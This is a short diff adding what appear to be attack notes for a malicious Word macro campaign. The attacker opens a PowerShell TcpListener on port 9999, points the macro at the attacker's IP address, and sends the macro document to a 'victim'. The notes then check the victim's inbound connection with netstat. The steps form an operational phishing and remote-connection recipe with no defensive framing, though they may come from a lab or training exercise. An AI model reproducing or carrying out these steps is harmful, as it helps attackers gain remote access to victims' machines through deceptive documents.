@@ -1,0 +1,12 @@
+Attacker sets up 'server'
+
+$listener=[System.net.Sockets.TcpListener]9999
+$listener.start()
+
+Change macro code to point at attacker's IP address.
+Send macro word doc to victim
+
+Verify connection from attacker's machine by typing
+netstat -ano | select-string 9999
+
+ - should show the listener running on 0.0.0.0:9999 and the victim machine Ip address on line 2
